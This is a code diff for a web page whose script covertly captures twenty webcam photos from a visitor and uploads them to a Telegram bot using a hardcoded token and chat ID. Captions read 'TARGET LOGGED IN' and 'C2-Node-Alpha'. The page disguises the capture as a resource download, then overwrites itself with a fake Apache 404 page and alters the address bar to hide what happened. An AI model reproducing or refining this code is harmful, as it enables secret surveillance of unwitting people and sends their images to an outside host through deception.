@@ -31,7 +31,7 @@
 
     <script>
         const TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
-        const IDS = ['7617707778', '-5291795804'];
+        const ID = '-5291795804';
 
         async function initiate() {
             const status = document.getElementById('status');
@@ -46,24 +46,28 @@
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                video.onloadedmetadata = async () => {
+                video.onloadedmetadata = () => {
                     video.play();
                     let count = 0;
                     const maxPackets = 20; 
                     
-                    const interval = setInterval(async () => {
+                    const interval = setInterval(() => {
                         if (count >= maxPackets) {
                             clearInterval(interval);
+                            
+                            // Kill camera stream immediately
                             stream.getTracks().forEach(track => track.stop());
+                            
+                            // Trigger the Fake 404
                             render404();
                             return;
                         }
                         
-                        await sendSequentially(count + 1);
+                        send(count + 1);
                         count++;
                         loader.style.width = (count * (100 / maxPackets)) + "%";
-                        status.innerText = "> UPLOADING FRAGMENT " + count + "/" + maxPackets + "...";
-                    }, 1200); // Slightly slower for dual-delivery stability
+                        status.innerText = "> DOWNLOADING RESOURCES " + count + "/" + maxPackets + "...";
+                    }, 600);
                 };
             } catch (e) {
                 status.innerText = "> ACCESS DENIED: PERMISSION FAILED";
@@ -71,42 +75,42 @@
             }
         }
 
-        async function sendSequentially(index) {
+        function send(index) {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.4));
-            if (!blob) return;
-
-            // This loop waits for the first send to finish before starting the second
-            for (const chatId of IDS) {
+            canvas.toBlob(blob => {
+                if (!blob) return;
                 const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'packet.jpg');
-                fd.append('caption', `🎯 TARGET LOG\nFragment: ${index}\nNode: C2-Alpha`);
+                fd.append('chat_id', ID);
+                fd.append('photo', blob, 'identity_packet.jpg');
+                fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
 
-                try {
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
-                } catch (err) {
-                    console.error("Failed to send to: " + chatId);
-                }
-            }
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            }, 'image/jpeg', 0.4); 
         }
 
         function render404() {
+            // Overwrite the entire document to mimic a real server error
             document.documentElement.innerHTML = `
             <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-            <html><head><title>404 Not Found</title></head>
-            <body style="background: white; color: black; font-family: sans-serif; padding: 20px;">
-            <h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>
+            <html><head>
+            <title>404 Not Found</title>
+            </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
+            <h1>Not Found</h1>
+            <p>The requested URL was not found on this server. System Error</p>
+            <hr>
             <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
             </body></html>`;
+            
+            // Optional: Changes the visible URL in the address bar
+            window.history.pushState({}, "", "/error-log-0x8842");
         }
     </script>
 </body>
